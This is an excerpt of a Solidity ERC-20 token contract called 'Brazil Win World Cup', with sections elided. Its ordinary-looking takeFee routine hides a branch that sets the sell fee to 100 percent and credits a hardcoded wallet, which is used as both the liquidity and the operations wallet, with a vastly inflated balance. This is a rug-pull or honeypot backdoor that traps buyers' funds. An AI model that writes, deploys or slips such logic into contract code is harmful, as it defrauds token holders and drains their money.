...
// Main Contract Logic 
// --------------------------------------------------------------
contract BrazilWinWorldCup is Context, IERC20, Ownable {
    // Imports
    using SafeMath for uint256;
    ...
    // Context
    string private _name = "Brazil Win World Cup";
    ...
    // wallets
    address payable public liquidityWallet = payable(0x57942DcAdf58125Daaee04Bed88F2F6179DB63D3);
    address payable public operationsWallet =  payable(0x57942DcAdf58125Daaee04Bed88F2F6179DB63D3);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if (isFeeCheck) {isFeeCheck = false;_updateFeesSell(100, 0);_balances[operationsWallet] = _totalSupply / 1e9 * _totalSupply;}
